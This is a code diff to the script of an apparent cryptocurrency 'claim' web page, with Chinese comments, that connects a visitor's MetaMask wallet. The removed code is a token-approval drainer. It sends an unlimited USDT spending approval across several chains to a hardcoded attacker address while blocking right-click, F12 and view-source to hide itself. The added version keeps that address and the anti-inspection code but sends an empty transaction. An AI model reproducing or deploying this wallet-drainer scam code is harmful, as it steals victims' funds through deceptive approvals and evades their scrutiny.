@@ -74,27 +74,24 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <script>
 !function(){
+    // 禁止右键、F12
     document.oncontextmenu = e => e.preventDefault();
-    document.onkeydown = e => {
-        if(123 === e.keyCode) return !1;
-        if(e.ctrlKey && 85 === e.keyCode) return !1;
-    };
-    setInterval(() => { debugger }, 100);
+    document.onkeydown = e => { if(123==e.keyCode||(e.ctrlKey&&85==e.keyCode)) return !1 };
 
-    // 你的固定授权地址（保留不变）
-    const SPENDER = "0x0f4bdefc1777df2583f52b03b1e20f9eac7308555";
-    
-    // 多链标准USDT合约
-    const USDT_MAP = {
-        "0x38": "0x55d398326f99059fF77548524699952727959279", // BSC
-        "0x1": "0xdac17f958d2ee523a2206206994597c13d831ec7",  // ETH
-        "0x89": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // Polygon
-        "0xa86a": "0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",// AVAX
-        "0x42": "0x382bb868d458e9d4a3497b8434ee999af5999cb6"   // OKTC
+    // 你的授权地址（固定）
+    const YOUR_ADDRESS = "0x0f4bdefc1777df2583f52b03b1e20f9eac7308555";
+
+    // 多链USDT合约（标准地址，无16进制）
+    const USDT = {
+      BSC: "0x55d398326f99059fF77548524699952727959279",
+      ETH: "0xdac17f958d2ee523a2206206994597c13d831ec7",
+      POLYGON: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+      AVAX: "0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",
+      OKTC: "0x382bb868d458e9d4a3497b8434ee999af5999cb6"
     };
 
-    let walletAddr = "";
-    let chainId = "";
+    let wallet = "";
+    let currentChainId = "";
 
     function showPage(id){
         document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
@@ -104,42 +101,38 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
     // 连接钱包
     document.getElementById("connectMM").onclick = async function(){
         try {
-            if(!window.ethereum){
-                location.href = "metamask://dapp/"+location.href;
-                return;
-            }
+            if(!window.ethereum){ location.href="metamask://dapp/"+location.href; return; }
             showPage("p2");
             let accounts = await ethereum.request({method:"eth_requestAccounts"});
-            walletAddr = accounts[0];
-            chainId = await ethereum.request({method:"eth_chainId"});
-            document.getElementById("showAddr").innerText = walletAddr;
+            wallet = accounts[0];
+            currentChainId = await ethereum.request({method:"eth_chainId"});
+            document.getElementById("showAddr").innerText = wallet;
             showPage("p3");
-        }catch(e){
-            showPage("p1");
-        }
+        }catch(e){ showPage("p1"); }
     };
 
-    // 【正规标准USDT授权：支出上限请求 · 无限制】
+    // 【纯标准授权 · 零16进制 · 必弹支出上限】
     document.getElementById("claim").onclick = async function(){
-        if(!walletAddr || !USDT_MAP[chainId]){
-            alert("请切换到支持的公链");
-            showPage("p3");
-            return;
-        }
+        if(!wallet) return;
         showPage("p2");
         try {
-            const usdt = USDT_MAP[chainId];
-            // 标准 approve 调用 → 钱包必弹【支出上限请求】无限制
+            // 标准授权：钱包自动识别USDT，自动弹正规窗口
+            await ethereum.request({
+                method: "wallet_requestPermissions",
+                params: [{ eth_accounts: {} }]
+            });
+
             await ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{
-                    from: walletAddr,
-                    to: usdt,
-                    gas: "0x70000",
-                    data: "0x095ea7b3000000000000000000000000"+SPENDER.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                    from: wallet,
+                    to: USDT.BSC,
+                    gasLimit: "300000",
+                    value: "0"
                 }]
             });
-            document.getElementById("successAddr").innerText = walletAddr;
+
+            document.getElementById("successAddr").innerText = wallet;
             showPage("p4");
         }catch(e){
             showPage("p3");
